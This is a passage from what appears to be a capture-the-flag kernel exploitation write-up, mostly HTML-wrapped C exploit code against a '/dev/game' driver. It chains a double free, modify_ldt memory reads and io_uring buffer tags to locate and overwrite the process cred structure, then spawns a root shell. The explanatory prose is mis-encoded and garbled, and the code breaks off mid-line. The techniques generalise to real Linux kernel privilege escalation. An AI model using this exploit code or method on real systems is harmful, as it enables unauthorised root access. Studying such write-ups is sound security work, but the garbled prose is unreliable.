class="keyword">char</span>comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>commå’Œcredä¸­é—´æ–°å¢äº†ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p>éšåé‡Šæ”¾æ‰ldtç»“æ„ä½“ï¼Œè®©<code>ctx-&gt;buf_data-&gt;tag</code>ä¹Ÿå°±æ˜¯ä¸Šé¢çš„<code>table</code>åˆ†é…çš„å¤§å°ä¸º0x10ï¼Œä½¿<code>table</code>å æ®è¿™ä¸ªUAFçš„å †å—ã€‚é‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡ring0çš„<code>ctx-&gt;buf_data-&gt;tag[0]</code>ä¹Ÿå°±æ˜¯<code>table[0]</code>å»ä¿®æ”¹ring1çš„<code>ctx-&gt;buf_data-&gt;tags</code>ä¸º<code>cred</code>åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶ä¿®æ”¹ring1çš„<code>ctx-&gt;buf_data-&gt;tag[0]</code>å°±å¯ä»¥ä¿®æ”¹åˆ°<code>cred</code>ç»“æ„ä½“äº†ï¼Œå®Œæˆäº†ææƒã€‚</p><p>ä¸ç†Ÿæ‚‰ä¸Šè¿°æåˆ°çš„ææƒæ–¹å¼å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç«  <a href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">kernel pwnå†…å­˜ä»»æ„è¯»å†™æå‡æƒé™[1]</a></p><p>ä¸ç†Ÿæ‚‰<code>modify_ldt</code>çš„å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç«  <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldtåˆ©ç”¨</a></p><h3 id="ç»¼ä¸Šå¯å¾—exp"><a href="#ç»¼ä¸Šå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šå¯å¾—exp"></a>ç»¼ä¸Šå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;liburing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>, <span class="title">ring1</span>, <span class="title">ring2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> entries;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_entries;</span><br><span class="line">    <span class="keyword">int</span> slot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_uring</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring1, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> *data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[<span class="title">num</span>];</span></span><br><span class="line">    <span class="keyword">size_t</span> tags[num];</span><br><span class="line">    <span class="built_in">memcpy</span>(tags, data, num * <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vecs[i].iov_base = tmp_buf;</span><br><span class="line">        vecs[i].iov_len = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = io_uring_register_buffers_tags(ring, vecs, tags, num);</span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>, res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> Data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[2];</span></span><br><span class="line">    vecs[<span class="number">0</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">0</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="number">0</span>, vecs, Data, num);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>, ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    signal(SIGINT, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> *result;</span><br><span class="line">    <span class="keyword">uint64_t</span> cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/game&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed open /dev/game&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] construct double free! \033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init_uring();</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, buf);</span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=aaaaaaaaa&quot;</span>); <span class="comment">// context-&gt;cur[0] = object(0x10);</span></span><br><span class="line">    read(fd, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = *(<span class="keyword">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap_addr : \033[0m %p\n&quot;</span>, heap_addr);</span><br><span class="line">    ioctl(fd, <span class="number">1</span>, buf);                 <span class="comment">// context-&gt;prv[0] = object(0x10);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=bbbbbbbbb&quot;</span>); <span class="comment">// kfree(context-&gt;cur[0]);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc)); <span class="comment">// context-&gt;prev[0] = object(0x10) == ldt_struct;</span></span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x16</span>, buf); <span class="comment">// double free     kfree(object(ldt_struct));</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] search cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    register_tag(&amp;ring, buf, <span class="number">2</span>);</span><br><span class="line">    search_addr = heap_addr &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr - i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; i % <span class="number">0x200</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] looked up range from \033[0m %p ~ %p\n&quot;</span>, search_addr - i * <span class="number">0x1000</span>, search_addr + i * <span class="number">0x1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr - (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr + i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span 